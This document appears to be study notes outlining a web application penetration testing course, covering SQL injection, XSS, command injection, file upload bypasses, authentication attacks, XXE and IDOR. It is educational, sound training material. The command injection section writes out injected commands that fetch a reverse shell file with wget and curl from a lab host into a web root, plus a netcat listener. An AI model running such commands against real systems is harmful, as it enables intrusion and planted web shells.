# Introduction
Description of the module

# Lab Setup
As the title says

# SQL Injection - Introduction
Some basic SQL, how to setup a database to test and quick reference to a basic tutorial

# SQL Injection - UNION
Showcase of reflected SQLi and using the UNION keyword to execute attacks
Showcase of information_schema to get database information
How to enumerate the number of columns and the values that they can take

# SQL Injection - Blind Part 1
Using Burp Suite and sqlmap
Using Burp's Repeater, Encoding characters in repeater
The payloads are not showing any results? It might be a blind injection
Use sqlmap: create a req.txt with the request
Is the chosen field failing? Move on to another target
See what the application is processing and try to inject it

# SQL Injection - Blind Part 2
We found the injection point, it's blind, let's dig in
We will construct a query that will get the DB version character by character
We will use `substring()`
We use both Burp and sqlmap

# XSS - Introduction
Overview of types
Live demo
Tip: avoid using `alert()` and instead use `print()` or `prompt()`
A sample payload using the keydown event listener

# XSS - DOM Lab
Find injection point
Determine type of XSS
Sample payload to cause a redirection

# XSS - Stored Lab
Firefox Multi Account Containers extension mention
Cookie editor extension mention
Test for html injection first, before attempting xss
webhook.site mention to use for payloads

# Command Injection - Introduction
Overview
Self contained demo of using the web console and php

# Command Injection - Basics
appsecexplained.gitbook.io reference
basic payloads and examples
popping a reverser shell: using payload all the things
using netcat to receive the reverse shell
`nc -nlvp`

# Command Injection - Blind/Out of band
Using webhook.site or burp collaborator to cause an out of band interaction
Take into account what characters are getting filtered
Instead of using a onliner reverse shell, we will upload a shell and then trigger it
Mention to the reverse shells in kali in `/usr/share/webshells/`
`https://tcm-sec.com \n wget 10.10.10.1:8080/rev.php`
`https://tcm-sec.com && curl 10.10.10.1:8080/rev.php > /var/www/html/rev.php`
use `commix` if we can't use Burp Pro's scanner

# Insecure File Upload - Introduction
Overview
Overriding files and or getting DoS

# Insecure File Upload - Basic Bypass
Determine is the check is client-side or server-side
php shell example

# Insecure File Upload - Magic Bytes
Using the magic bytes of a png to bypass server-side checks
Mention to also try other not some common file extensions
google `valid php file extensions` and try to bypass a blacklist
Portswigger mention

# Attacking Authentication - Introduction
Overview

# Attacking Authentication
Brute force attacks
Think methodically
Using Burp's intruder
Using ffuf `-request` flag

# Attacking Authentication - MFA
appsecexplained.gitbook.io reference
Thinkering how to break or manipulate the intended order of steps
Are tokens linked to a specific account?

# XXE
Overview of what it is
Payloadsallthethings reference for payloads
Sent XML to some APIs expecting JSON

# IDOR
Insecure Direct Object Reference
When found in API driven applications we call it BOLA
